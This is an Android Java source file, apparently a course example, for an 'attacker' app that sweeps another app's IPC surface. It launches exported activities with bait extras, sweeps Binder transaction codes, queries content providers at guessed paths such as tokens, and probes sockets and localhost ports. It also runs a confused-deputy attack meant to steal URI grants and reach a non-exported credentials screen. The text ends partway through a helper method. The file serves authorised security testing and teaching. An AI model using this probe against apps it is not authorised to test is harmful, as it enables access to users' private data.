/*
 * ProbeActivity.java — 24-IPC / examples/attacker-app
 *
 * WHAT IT DOES
 *     Runs, from an ORDINARY third-party application UID with no permissions
 *     except INTERNET, a complete sweep of another app's IPC surface:
 *
 *       0. package visibility        — can we even see the target? (<queries>)
 *       1. exported activities       — startActivity() with bait extras
 *       2. exported services         — startService() and bindService(),
 *                                      then a transaction-code sweep on the
 *                                      returned IBinder
 *       3. exported receivers        — sendOrderedBroadcast() with a result
 *                                      receiver, so we can tell delivery from
 *                                      silence
 *       4. content providers         — query() on every declared authority
 *       5. abstract UNIX sockets     — LocalSocket connect(), NO permission
 *       6. localhost TCP listeners   — connect() to 127.0.0.1, needs INTERNET
 *       7. confused deputy           — intent redirection and URI-grant theft
 *
 *     Every probe prints one of five verdicts:
 *
 *       REACHABLE  the operation succeeded from an unprivileged app UID.
 *                  This is a real, reportable reachability claim.
 *       DENIED     the platform refused us (SecurityException / bind refused).
 *                  Not reachable by a third-party app.
 *       ABSENT     the component or endpoint does not exist, or package
 *                  visibility filtering is hiding it. Check <queries> FIRST.
 *       ERROR      the target accepted the request and then threw. That is
 *                  still REACHABLE — the door opened, the room was untidy.
 *       INCONCLUSIVE the API cannot tell us (sendBroadcast is fire-and-forget).
 *                  Confirm from the TARGET's logcat.
 *
 * WHY IT MATTERS
 *     `adb shell` runs as UID 2000 in the SELinux domain `shell`, and holds
 *     privileges no installed app has. A component you started with `am start`
 *     is NOT thereby proven reachable by an attacker. Roughly half of all
 *     rejected Android IPC findings are rejected for exactly this reason.
 *
 *     This APK closes that gap. It runs as `untrusted_app` with an ordinary
 *     10000+ UID, so anything it prints REACHABLE is something any app the user
 *     installs — a flashlight, a game, a QR scanner — can also do.
 *
 *     See Chapter 24 section 3.22 step 4, and
 *     ../../../77-UsefulCommands/labs/lab-03-exported-sweep.md.
 *
 * HOW TO RUN
 *     # host
 *     ./gradlew -p examples/attacker-app assembleDebug
 *     adb install -r examples/attacker-app/build/outputs/apk/debug/attacker-app-debug.apk
 *     adb logcat -c
 *
 *     # default target (edit DEFAULT_TARGET, or override at launch):
 *     adb shell am start -n com.attacker.poc/.ProbeActivity
 *     adb shell am start -n com.attacker.poc/.ProbeActivity --es target com.example.target
 *
 *     # narrow the sweep while you are iterating:
 *     adb shell am start -n com.attacker.poc/.ProbeActivity \
 *         --es target com.example.target --es only providers,sockets
 *
 *     # adb shell
 *     logcat -s poc:I
 *
 * REQUIREMENTS
 *     - Android 5.0+ (API 21+). compileSdk 34, minSdk 21 in build.gradle.
 *     - The target package listed in <queries> in AndroidManifest.xml.
 *       Without it, everything reports ABSENT on API 30+ and you will misread
 *       that as "not reachable".
 *     - No root. No Frida. Nothing but an installed APK.
 *
 * AUTHORISED TESTING ONLY. This app exists to prove reachability against
 * targets you own or have written permission to test.
 */
package com.attacker.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.ViewGroup;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

public class ProbeActivity extends Activity {

    // ---------------------------------------------------------------- config --

    private static final String TAG = "poc";

    /** Edit this, or override at launch with `--es target <pkg>`. */
    private static final String DEFAULT_TARGET = "com.example.target";

    /**
     * The exported component we believe forwards a caller-supplied Intent —
     * the "deputy" in section 3.20. Override with `--es deputy <class>`.
     */
    private static final String DEFAULT_DEPUTY = ".ShareHandlerActivity";

    /** The extra key the deputy reads the nested Intent from. */
    private static final String DEFAULT_REDIRECT_KEY = "next_intent";

    /**
     * Bait extras. Exported components that consume a URL, a nested route, or a
     * boolean "already authenticated" flag are where the high-severity findings
     * are. We supply all of them to every activity; harmless if unused.
     */
    private static final String BAIT_URL = "https://attacker.example/probe";

    /** Ports that recur in real apps. See Chapter 24 section 3.11.1. */
    private static final int[] LOOPBACK_PORTS = {
        1080, 3000, 4444, 5000, 5037, 6000, 6666, 8000, 8080, 8081,
        8118, 8888, 9000, 9050, 9090, 9222, 27042
    };

    /** How long to wait between activity launches so the device keeps up. */
    private static final long ACTIVITY_SETTLE_MS = 1200L;

    // ------------------------------------------------------------------ state --

    private String target = DEFAULT_TARGET;
    private String deputy = DEFAULT_DEPUTY;
    private String redirectKey = DEFAULT_REDIRECT_KEY;
    private Set<String> only = null;              // null == run everything

    private final StringBuilder report = new StringBuilder();
    private final Handler ui = new Handler(Looper.getMainLooper());
    private TextView out;

    private int countReachable = 0;
    private int countDenied = 0;
    private int countAbsent = 0;

    // ----------------------------------------------------------------- lifecycle

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        out = new TextView(this);
        out.setTextSize(11f);
        out.setTextIsSelectable(true);
        out.setPadding(24, 24, 24, 24);
        ScrollView sv = new ScrollView(this);
        sv.addView(out, new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT));
        setContentView(sv);

        Intent launch = getIntent();
        if (launch != null) {
            if (launch.getStringExtra("target") != null) {
                target = launch.getStringExtra("target");
            }
            if (launch.getStringExtra("deputy") != null) {
                deputy = launch.getStringExtra("deputy");
            }
            if (launch.getStringExtra("key") != null) {
                redirectKey = launch.getStringExtra("key");
            }
            String sel = launch.getStringExtra("only");
            if (sel != null) {
                only = new LinkedHashSet<String>(Arrays.asList(sel.split(",")));
            }
        }

        // Everything runs off the main thread. java.net.Socket on the main
        // thread throws NetworkOnMainThreadException, and a long sweep would
        // trigger an ANR. This is not incidental tidiness — it is required.
        new Thread(new Runnable() {
            @Override public void run() { runAll(); }
        }, "ipc-probe").start();
    }

    // ------------------------------------------------------------------ runner --

    private void runAll() {
        header();

        if (enabled("visibility")) probeVisibility();
        PackageInfo pi = getTargetPackageInfo();

        if (enabled("activities")) probeActivities(pi);
        if (enabled("services"))   probeServices(pi);
        if (enabled("receivers"))  probeReceivers(pi);
        if (enabled("providers"))  probeProviders(pi);
        if (enabled("sockets"))    probeAbstractSockets();
        if (enabled("localhost"))  probeLocalhost();
        if (enabled("deputy"))     probeConfusedDeputy();

        summary();
    }

    private boolean enabled(String phase) {
        return only == null || only.contains(phase);
    }

    private void header() {
        note("================================================================");
        note(" IPC reachability probe — running as an ORDINARY application");
        note("================================================================");
        note("  our package  : " + getPackageName());
        note("  our uid      : " + android.os.Process.myUid()
                + "   (an app UID, NOT shell's 2000)");
        note("  target       : " + target);
        note("  device       : " + Build.MANUFACTURER + " " + Build.MODEL
                + "  Android " + Build.VERSION.RELEASE
                + " (API " + Build.VERSION.SDK_INT + ")");
        note("  build        : " + Build.FINGERPRINT);
        note("  patch level  : " + (Build.VERSION.SDK_INT >= 23
                ? Build.VERSION.SECURITY_PATCH : "n/a"));
        note("");
        note("  Anything below marked REACHABLE is reachable by ANY app the");
        note("  user installs. Anything marked DENIED is not. Record both.");
        note("");
    }

    // --------------------------------------------------------- 0. visibility --

    /**
     * Before any conclusion can be drawn, establish that we can SEE the target.
     * On API 30+, package visibility filtering makes an unlisted package look
     * exactly like an uninstalled one. Diagnosing that here, once, prevents
     * every later ABSENT from being misread.
     */
    private void probeVisibility() {
        section("0. Package visibility (<queries>)");
        PackageManager pm = getPackageManager();
        try {
            PackageInfo pi = pm.getPackageInfo(target, 0);
            note("  [visibility] REACHABLE — target is visible to us");
            note("      versionName    = " + pi.versionName);
            note("      target uid     = " + pi.applicationInfo.uid);
            note("      targetSdk      = " + pi.applicationInfo.targetSdkVersion);
            note("      minSdk         = " + (Build.VERSION.SDK_INT >= 24
                    ? String.valueOf(pi.applicationInfo.minSdkVersion) : "?"));
            note("      dataDir        = " + pi.applicationInfo.dataDir);
            note("");
            note("      targetSdk decides which platform mitigations apply to");
            note("      the TARGET. Record it before judging any finding.");
        } catch (PackageManager.NameNotFoundException e) {
            countAbsent++;
            note("  [visibility] ABSENT — cannot see " + target);
            note("");
            note("      This means ONE of two things, and they are very");
            note("      different:");
            note("        (a) the package is genuinely not installed; or");
            note("        (b) we are on API 30+ and our <queries> block does");
            note("            not list it, so the platform is hiding it.");
            note("");
            note("      Check (b) first. Add to AndroidManifest.xml:");
            note("          <queries>");
            note("            <package android:name=\"" + target + "\" />");
            note("          </queries>");
            note("      and rebuild. Do NOT report 'not reachable' until you");
            note("      have ruled this out — it is a self-inflicted false");
            note("      negative, and it is extremely common.");
        }
    }

    private PackageInfo getTargetPackageInfo() {
        int flags = PackageManager.GET_ACTIVITIES
                  | PackageManager.GET_SERVICES
                  | PackageManager.GET_RECEIVERS
                  | PackageManager.GET_PROVIDERS;
        if (Build.VERSION.SDK_INT >= 24) {
            flags |= PackageManager.MATCH_DISABLED_COMPONENTS;
        }
        try {
            return getPackageManager().getPackageInfo(target, flags);
        } catch (Exception e) {
            note("  [enumerate] cannot enumerate components: " + e);
            note("              falling back to socket and localhost probes only");
            return null;
        }
    }

    // --------------------------------------------------------- 1. activities --

    private void probeActivities(PackageInfo pi) {
        section("1. Exported activities");
        if (pi == null || pi.activities == null) {
            note("  (no activity list available)");
            return;
        }

        List<ActivityInfo> exported = new ArrayList<ActivityInfo>();
        for (ActivityInfo ai : pi.activities) {
            if (ai.exported) exported.add(ai);
        }
        note("  " + exported.size() + " of " + pi.activities.length
                + " activities are declared exported");
        note("");

        for (ActivityInfo ai : exported) {
            // An exported activity guarded by a permission is only reachable if
            // WE hold that permission. Report the guard, then try anyway — the
            // protectionLevel decides whether the guard is real.
            if (ai.permission != null) {
                note("  [activity] " + shortName(ai.name)
                        + "  guarded by " + ai.permission);
                note("             protectionLevel: "
                        + protectionLevelOf(ai.permission)
                        + "   (only `signature` is a real control)");
            }

            Intent i = new Intent();
            i.setComponent(new ComponentName(target, ai.name));
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                     | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            // Bait. Costs nothing, and an activity that renders one of these is
            // the finding you came for.
            i.putExtra("url", BAIT_URL);
            i.putExtra("link", BAIT_URL);
            i.putExtra("uri", BAIT_URL);
            i.putExtra("redirect", BAIT_URL);
            i.putExtra("is_authenticated", true);
            i.putExtra("admin", true);
            i.putExtra("debug", true);

            try {
                startActivity(i);
                verdict("activity", shortName(ai.name), "REACHABLE",
                        "started with bait extras — watch the target's screen"
                        + " and logcat");
            } catch (SecurityException e) {
                verdict("activity", shortName(ai.name), "DENIED", msg(e));
            } catch (android.content.ActivityNotFoundException e) {
                verdict("activity", shortName(ai.name), "ABSENT",
                        "not resolvable — check <queries>, or the component is"
                        + " disabled");
            } catch (Exception e) {
                verdict("activity", shortName(ai.name), "ERROR", msg(e));
            }

            sleep(ACTIVITY_SETTLE_MS);
        }

        // Bring ourselves back to the front so the on-screen report is readable.
        Intent back = new Intent(this, ProbeActivity.class);
        back.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                    | Intent.FLAG_ACTIVITY_NEW_TASK);
        try { startActivity(back); } catch (Exception ignored) { }
    }

    // ----------------------------------------------------------- 2. services --

    private void probeServices(PackageInfo pi) {
        section("2. Exported services");
        if (pi == null || pi.services == null) {
            note("  (no service list available)");
            return;
        }

        for (ServiceInfo si : pi.services) {
            if (!si.exported) continue;
            if (si.permission != null) {
                note("  [service] " + shortName(si.name)
                        + "  guarded by " + si.permission
                        + "  (" + protectionLevelOf(si.permission) + ")");
            }

            final ComponentName cn = new ComponentName(target, si.name);

            // --- 2a. startService -------------------------------------------
            Intent start = new Intent().setComponent(cn);
            try {
                startService(start);
                verdict("service.start", shortName(si.name), "REACHABLE",
                        "startService accepted");
            } catch (SecurityException e) {
                verdict("service.start", shortName(si.name), "DENIED", msg(e));
            } catch (IllegalStateException e) {
                // API 26+ background-start restriction. This is a restriction on
                // US, not a protection on the target: a foreground app, or one
                // using startForegroundService, is unaffected. Do not record it
                // as "the target is protected".
                verdict("service.start", shortName(si.name), "INCONCLUSIVE",
                        "background-start restriction on the CALLER (API 26+): "
                        + msg(e));
            } catch (Exception e) {
                verdict("service.start", shortName(si.name), "ERROR", msg(e));
            }

            // --- 2b. bindService and transaction sweep ----------------------
            Intent bind = new Intent().setComponent(cn);
            ServiceConnection conn = new ServiceConnection() {
                @Override public void onServiceConnected(ComponentName n, IBinder b) {
                    String desc = descriptorOf(b);
                    verdict("service.bind", shortName(n.getClassName()), "REACHABLE",
                            "bound, interface descriptor = " + desc);
                    sweepTransactions(b, desc);
                    try { unbindService(this); } catch (Exception ignored) { }
                }
                @Override public void onServiceDisconnected(ComponentName n) { }
            };
            try {
                boolean ok = bindService(bind, conn, Context.BIND_AUTO_CREATE);
                if (!ok) {
                    // bindService returning false means the system would not
                    // even attempt the bind: not exported, no permission, or the
                    // service does not exist.
                    verdict("service.bind", shortName(si.name), "DENIED",
                            "bindService returned false");
                }
            } catch (SecurityException e) {
                verdict("service.bind", shortName(si.name), "DENIED", msg(e));
            } catch (Exception e) {
                verdict("service.bind", shortName(si.name), "ERROR", msg(e));
            }
            sleep(600);
        }
    }

    /**
     * Probe transaction codes on a bound IBinder.
     *
     * The generated AIDL Stub dispatches on an integer code in onTransact().
     * Codes start at IBinder.FIRST_CALL_TRANSACTION (0x00000001) and run in
     * .aidl declaration order. Hand-written onTransact overrides frequently
     * handle EXTRA, undocumented codes that no .aidl mentions — which is why we
     * sweep a range rather than only the codes we decompiled.
     *
     * We send an empty parcel carrying only the interface token. A method that
     * needs arguments will throw on the far side; that exception is itself
     * information — it proves the code is HANDLED and that we were allowed to
     * call it. A code that is not handled returns false without complaint.
     */
    private void sweepTransactions(IBinder b, String descriptor) {
        note("      transaction-code sweep (empty parcel, token = "
                + descriptor + "):");
        for (int code = 1; code <= 24; code++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                if (descriptor != null && descriptor.length() > 0) {
                    data.writeInterfaceToken(descriptor);
                }
                boolean handled = b.transact(code, data, reply, 0);
                if (handled) {
                    note(String.format(Locale.US,
                            "        code %-3d HANDLED   replyBytes=%d",
                            code, reply.dataSize()));
                }
            } catch (RemoteException e) {
                note(String.format(Locale.US,
                        "        code %-3d REMOTE ERR %s  <- handled, and we"
                        + " were permitted to call it", code, e.getClass().getSimpleName()));
            } catch (SecurityException e) {
                note(String.format(Locale.US,
                        "        code %-3d DENIED    %s", code, msg(e)));
            } catch (Exception e) {
                note(String.format(Locale.US,
                        "        code %-3d %s", code, e.getClass().getSimpleName()));
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
        note("      A handled code with no caller check is a privileged method");
        note("      callable by any app. Decompile the Stub to name it: the");
        note("      DESCRIPTOR string and the TRANSACTION_* constants give you");
        note("      the original .aidl. See Chapter 24 section 6.1.");
    }

    // ---------------------------------------------------------- 3. receivers --

    private void probeReceivers(PackageInfo pi) {
        section("3. Exported broadcast receivers");
        if (pi == null || pi.receivers == null) {
            note("  (no receiver list available)");
            return;
        }

        note("  NOTE: sendBroadcast() is fire-and-forget. It returns normally");
        note("  even when nothing was permitted to run, so 'no exception' is");
        note("  NOT proof of delivery. We use sendOrderedBroadcast() with a");
        note("  result receiver, which at least tells us the broadcast");
        note("  completed, and we cross-check against the TARGET's logcat.");
        note("");

        for (final ActivityInfo ri : pi.receivers) {
            if (!ri.exported) continue;

            Intent i = new Intent();
            i.setComponent(new ComponentName(target, ri.name));
            i.putExtra("cmd", "probe");
            i.putExtra("url", BAIT_URL);
            i.putExtra("sync_url", BAIT_URL);

            try {
                sendOrderedBroadcast(i, null, new android.content.BroadcastReceiver() {
                    @Override public void onReceive(Context c, Intent in) {
                        verdict("receiver", shortName(ri.name), "REACHABLE",
                                "ordered broadcast completed, resultCode="
                                + getResultCode() + " data=" + getResultData());
                    }
                }, null, 0, null, null);
                verdict("receiver", shortName(ri.name), "INCONCLUSIVE",
                        "broadcast dispatched; confirm from the TARGET's logcat"
                        + " that onReceive ran");
            } catch (SecurityException e) {
                verdict("receiver", shortName(ri.name), "DENIED", msg(e));
            } catch (Exception e) {
                verdict("receiver", shortName(ri.name), "ERROR", msg(e));
            }
        }

        note("");
        note("  Our own Eavesdropper receiver is registered at maximum priority");
        note("  for the target's known broadcast actions. Anything the target");
        note("  sends WITHOUT a receiver permission and WITHOUT setPackage()");
        note("  lands there. Watch `logcat -s poc:I` while you exercise the");
        note("  target's normal features — that is the sending-direction leak,");
        note("  and no manifest analysis of the target will ever show it.");
    }

    // ---------------------------------------------------------- 4. providers --

    private void probeProviders(PackageInfo pi) {
        section("4. Content providers");
        if (pi == null || pi.providers == null) {
            note("  (no provider list available — check the <provider"
                    + " android:authorities=...> entries in <queries>)");
            return;
        }

        for (ProviderInfo p : pi.providers) {
            if (p.authority == null) continue;
            note("  [provider] " + shortName(p.name)
                    + "  authority=" + p.authority
                    + "  exported=" + p.exported
                    + "  grantUriPermissions=" + p.grantUriPermissions);
            if (p.readPermission != null) {
                note("             readPermission="  + p.readPermission
                        + " (" + protectionLevelOf(p.readPermission) + ")");
            }
            if (p.writePermission != null) {
                note("             writePermission=" + p.writePermission
                        + " (" + protectionLevelOf(p.writePermission) + ")");
            }

            for (String auth : p.authority.split(";")) {
                queryUri("content://" + auth);
                // Common path guesses. A real engagement replaces these with
                // paths harvested from the decompiled provider and from any
                // UriMatcher.addURI() calls.
                String[] guesses = {
                    "users", "user", "accounts", "tokens", "session",
                    "settings", "config", "messages", "files", "cache", "data"
                };
                for (String g : guesses) {
                    queryUri("content://" + auth + "/" + g);
                }
            }
        }

        note("");
        note("  A provider that answers is the highest-value finding class in");
        note("  this chapter, because it usually sits directly on a database.");
        note("  Follow up with the four injection points — projection,");
        note("  selection, sortOrder and the path itself — and with openFile()");
        note("  traversal. See Chapter 24 section 3.7 and 27-ContentProviders.");
    }

    private void queryUri(String uriStr) {
        Uri uri = Uri.parse(uriStr);
        Cursor c = null;
        try {
            c = getContentResolver().query(uri, null, null, null, null);
            if (c == null) {
                // A null cursor is ambiguous: the provider may have refused
                // silently, or the path may not match its UriMatcher.
                verdict("provider", uriStr, "INCONCLUSIVE",
                        "null cursor — path may not match, or refused silently");
                return;
            }
            StringBuilder sb = new StringBuilder();
            sb.append(c.getCount()).append(" rows, columns=")
              .append(Arrays.toString(c.getColumnNames()));
            if (c.moveToFirst()) {
                sb.append("\n        first row: ");
                for (int i = 0; i < c.getColumnCount(); i++) {
                    sb.append(c.getColumnName(i)).append('=')
                      .append(safeString(c, i)).append(' ');
                }
            }
            verdict("provider", uriStr, "REACHABLE", sb.toString());
        } catch (SecurityException e) {
            verdict("provider", uriStr, "DENIED", msg(e));
        } catch (IllegalArgumentException e) {
            // "Unknown URL" / "Unknown authority" — the authority is not
            // resolvable to us. On API 30+ suspect <queries> before concluding
            // the provider does not exist.
            verdict("provider", uriStr, "ABSENT", msg(e));
        } catch (Exception e) {
            verdict("provider", uriStr, "ERROR", msg(e));
        } finally {
            if (c != null) { try { c.close(); } catch (Exception ignored) { } }
        }
    }

    private static String safeString(Cursor c, int i) {
        try { return c.getString(i); } catch (Exception e) { return "<non-text>"; }
    }

    // ---------------------------------------------- 5. abstract UNIX sockets --

    /**
     * Abstract-namespace UNIX sockets are the most under-tested surface on the
     * platform, for one structural reason:
     *
     *     AN ABSTRACT SOCKET HAS NO FILESYSTEM ENTRY AT ALL. No inode, no
     *     owner, no group, no mode bits. There is not even a permission to get
     *     wrong. Any process in the same network namespace — which on Android
     *     means every app on the device — can connect if it knows the name.
     *
     * android.net.LocalServerSocket's single-string constructor uses this
     * namespace by default, so the easiest thing an Android developer can
     * write is also the most exposed thing they can write.
     *
     * We need NO permission for this probe. Not even INTERNET.
     */
    private void probeAbstractSockets() {
        section("5. Abstract-namespace UNIX sockets (@name)");
        note("  No permission is required to connect to any of these.");
        note("  There is no mode bit protecting them, because there is no file.");
        note("");

        Set<String> names = new LinkedHashSet<String>();
        names.add(target);
        names.add(target + ".ipc");
        names.add(target + "_ipc");
        names.add(target + ".sock");
        names.add(target + ".bridge");
        names.add(target + ".server");
        names.add(target + "_worker");
        names.add(target + "_remote");
        // The WebView inspector socket. If the target ever called
        // WebView.setWebContentsDebuggingEnabled(true) — which many apps do
        // unconditionally instead of gating on BuildConfig.DEBUG — this is a
        // full Chrome DevTools Protocol endpoint: JavaScript execution, DOM,
        // cookies and localStorage inside the app's WebView. See 43-WebView.
        names.add("chrome_devtools_remote");
        names.add("webview_devtools_remote_" + target);
        // Short package tail, e.g. com.example.target -> target
        int dot = target.lastIndexOf('.');
        if (dot > 0 && dot < target.length() - 1) {
            names.add(target.substring(dot + 1));
            names.add(target.substring(dot + 1) + "_ipc");
        }

        for (String name : names) {
            LocalSocket s = new LocalSocket();
            try {
                s.connect(new LocalSocketAddress(
                        name, LocalSocketAddress.Namespace.ABSTRACT));
                s.setSoTimeout(1500);
                verdict("abstract-socket", "@" + name, "REACHABLE",
                        "connected with zero permissions");

                OutputStream os = s.getOutputStream();
                os.write("{\"cmd\":\"ping\"}\n".getBytes("UTF-8"));
                os.flush();
                byte[] buf = new byte[1024];
                int n = s.getInputStream().read(buf);
                if (n > 0) {
                    note("        reply: "
                            + new String(buf, 0, n, "UTF-8").trim());
                    note("        -> the endpoint SPEAKS. Reverse the protocol"
                            + " and enumerate its commands; that determines"
                            + " severity, not the mere fact of connecting.");
                } else {
                    note("        connected but no reply to a JSON ping.");
                    note("        Try a bare newline, a length-prefixed frame,"
                            + " or protobuf. Absence of a reply does not mean"
                            + " the endpoint is inert.");
                }
            } catch (IOException e) {
                // ECONNREFUSED here means "no such abstract name is bound",
                // which is the normal case for a guess that missed.
                verdict("abstract-socket", "@" + name, "ABSENT", msg(e));
            } catch (Exception e) {
                verdict("abstract-socket", "@" + name, "ERROR", msg(e));
            } finally {
                try { s.close(); } catch (IOException ignored) { }
            }
        }

        note("");
        note("  Guessing names is a weak method. Get the real list from the");
        note("  device instead:  adb shell cat /proc/net/unix | grep '@'");
        note("  then feed the names back into this probe. See");
        note("  ../../scripts/enumerate-ipc-surface.sh and");
        note("  ../../scripts/abstract-socket-probe.py.");
    }

    // ------------------------------------------------- 6. localhost listeners --

    /**
     * A listening socket on 127.0.0.1 is reachable by any app holding INTERNET.
     * INTERNET is protectionLevel="normal": granted silently at install, never
     * shown to the user, held by essentially every app. So "we only listen on
     * localhost" means "we listen to every app on the device".
     */
    private void probeLocalhost() {
        section("6. Localhost TCP listeners (127.0.0.1)");
        note("  This is the only probe that needs a permission, and the");
        note("  permission is INTERNET — auto-granted, invisible to the user.");
        note("");

        for (int port : LOOPBACK_PORTS) {
            Socket s = new Socket();
            try {
                s.connect(new InetSocketAddress("127.0.0.1", port), 400);
                verdict("localhost", "127.0.0.1:" + port, "REACHABLE",
                        "port is open");
                s.setSoTimeout(1200);
                s.getOutputStream().write(
                        ("GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                       + "Connection: close\r\n\r\n").getBytes("UTF-8"));
                s.getOutputStream().flush();
                BufferedReader r = new BufferedReader(
                        new InputStreamReader(s.getInputStream()));
                String first = r.readLine();
                if (first != null) {
                    note("        banner: " + first);
                    note("        -> if this is an HTTP server, enumerate its");
                    note("           routes. Owner UID and package come from");
                    note("           /proc/net/tcp; see the enumeration script.");
                }
            } catch (IOException e) {
                // Closed ports are the overwhelming majority. Do not log each.
                countAbsent++;
            } catch (Exception e) {
                verdict("localhost", "127.0.0.1:" + port, "ERROR", msg(e));
            } finally {
                try { s.close(); } catch (IOException ignored) { }
            }
        }

        note("  (closed ports are counted, not listed)");
        note("");
        note("  If you find a listener, ALSO check whether it is bound to");
        note("  0.0.0.0 rather than 127.0.0.1. NanoHTTPD(int port) and");
        note("  new ServerSocket(port) both bind ALL interfaces by default, so");
        note("  the same server may be reachable from the WiFi network too.");
        note("  Confirm from your laptop:  curl http://<device-ip>:<port>/");
        note("  That escalates the finding: the attacker no longer needs to be");
        note("  on the device at all.");
    }

    // ---------------------------------------------------- 7. confused deputy --

    /**
     * Intent redirection and URI-grant theft (Chapter 24 section 3.20).
     *
     * We hand an exported component of the target an Intent, inside an extra,
     * and ask it to start that Intent for us. If it does, the resulting
     * startActivity() call carries the TARGET's UID, not ours. Two consequences:
     *
     *   1. It can start the target's own NON-exported components, because
     *      same-UID components can always reach each other.
     *   2. Any FLAG_GRANT_*_URI_PERMISSION on the inner Intent is evaluated
     *      with the TARGET as the granter, so the target hands us a legitimate,
     *      framework-issued read grant on its own non-exported provider.
     *
     * The target app is not compromised and is not malicious. It is confused
     * about whose authority it is exercising.
     */
    private void probeConfusedDeputy() {
        section("7. Confused deputy — intent redirection and URI-grant theft");

        String deputyClass = deputy.startsWith(".") ? target + deputy : deputy;
        note("  deputy component : " + deputyClass);
        note("  redirect extra   : " + redirectKey);
        note("  (override with --es deputy <class> --es key <extra>)");
        note("");

        // --- 7a. reach a non-exported component -----------------------------
        Intent innerReach = new Intent();
        innerReach.setClassName(target, target + ".internal.AccountSettingsActivity");
        innerReach.putExtra("show_credentials", true);

        // --- 7b. steal a URI grant on the target's own private provider -----
        Intent innerGrant = new Intent(Intent.ACTION_VIEW);
        innerGrant.setClassName(getPackageName(), getPackageName() + ".GrantSink");
        innerGrant.setData(Uri.parse("content://" + target + ".provider/users/1"));
        innerGrant.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        innerGrant.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);

        fireDeputy(deputyClass, innerReach,
                "reach a NON-exported activity through the deputy");
        sleep(1500);
        fireDeputy(deputyClass, innerGrant,
                "make the deputy grant US read access to its private provider");

        note("");
        note("  Read the verdicts carefully. 'outer intent delivered' only");
        note("  means the deputy accepted our message. Whether the redirection");
        note("  actually happened is decided in GrantSink's log line and in the");
        note("  target's own behaviour.");
        note("");
        note("  And then walk the reach-through before assigning severity:");
        note("    reaches a private provider holding credentials  -> High/Critical");
        note("    reaches an internal WebView loading our URL     -> High/Critical");
        note("    reaches a non-exported screen with no data      -> Low/Medium");
        note("    reaches only ALREADY-EXPORTED components        -> NOT A FINDING");
        note("  That last row is the one that protects your credibility.");
    }

    private void fireDeputy(String deputyClass, Intent inner, String what) {
        Intent outer = new Intent(Intent.ACTION_SEND);
        outer.setType("image/*");
        outer.setClassName(target, deputyClass);
        outer.putExtra(redirectKey, inner);
        // Some routers use different key names; supplying several costs nothing.
        outer.putExtra("intent", inner);
        outer.putExtra("forward_intent", inner);
        outer.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            startActivity(outer);
            verdict("deputy", what, "REACHABLE",
                    "outer intent delivered to " + shortName(deputyClass));
        } catch (SecurityException e) {
            verdict("deputy", what, "DENIED", msg(e));
        } catch (android.content.ActivityNotFoundException e) {
            verdict("deputy", what, "ABSENT",
                    "deputy component not found — set --es deputy <class>");
        } catch (Exception e) {
            verdict("deputy", what, "ERROR", msg(e));
        }
    }

    // ----------------------------------------------------------- reporting ----

    private void summary() {
        section("Summary");
        note("  REACHABLE : " + countReachable
                + "   <- claims you may make about a third-party app");
        note("  DENIED    : " + countDenied
                + "   <- the platform genuinely stopped an ordinary app");
        note("  ABSENT    : " + countAbsent
                + "   <- absent, OR hidden by package visibility filtering");
        note("");
        note("  Before writing any of this up:");
        note("   1. Re-run the same operations from `adb shell` and record the");
        note("      difference. Anything that works ONLY from the shell is a");
        note("      shell privilege, not an app vulnerability. Say so.");
        note("   2. Record the target's targetSdk, your device fingerprint and");
        note("      the security patch level — printed at the top of this run.");
        note("   3. Walk the reach-through for every REACHABLE entry: what can");
        note("      you make it do that you could not do directly?");
        note("   4. Assign severity from what the door actually leads to, and");
        note("      document what you considered and ruled out.");
        note("");
        note("  Capture this output with:  adb logcat -d -s poc:I > evidence.txt");
    }

    private void section(String title) {
        note("");
        note("----------------------------------------------------------------");
        note(" " + title);
        note("----------------------------------------------------------------");
    }

    private void verdict(String kind, String what, String state, String detail) {
        if ("REACHABLE".equals(state))      countReachable++;
        else if ("DENIED".equals(state))    countDenied++;
        else if ("ABSENT".equals(state))    countAbsent++;
        note(String.format(Locale.US, "  [%s] %-11s %s%s",
                kind, state, what, (detail == null ? "" : "\n        " + detail)));
    }

    private void note(final String s) {
        Log.i(TAG, s);
        report.append(s).append('\n');
        ui.post(new Runnable() {
            @Override public void run() {
                if (out != null) out.setText(report.toString());
            }
        });
    }

    // ------------------------------------------------------------- helpers ----

    /** Resolve a permission's protectionLevel. Only `signature` is a control. */
    private String protectionLevelOf(String permission) {
        try {
            android.content.pm.PermissionInfo pi =
                    getPackageManager().getPermissionInfo(permission, 0);
            int level = (Build.VERSION.SDK_INT >= 28)
                    ? pi.getProtection() : (pi.protectionLevel & 0x0f);
            switch (level) {
                case android.content.pm.PermissionInfo.PROTECTION_NORMAL:
                    return "normal — ANY app can hold it, not a control";
                case android.content.pm.PermissionInfo.PROTECTION_DANGEROUS:
                    return "dangerous — user prompt, a malicious app will just ask";
                case android.content.pm.PermissionInfo.PROTECTION_SIGNATURE:
                    return "signature — a real control";
                default:
                    return "level=" + level;
            }
        } catch (Exception e) {
            return "unknown (" + msg(e) + ")";
        }
    }

    private String shortName(String fqcn) {
        if (fqcn == null) return "?";
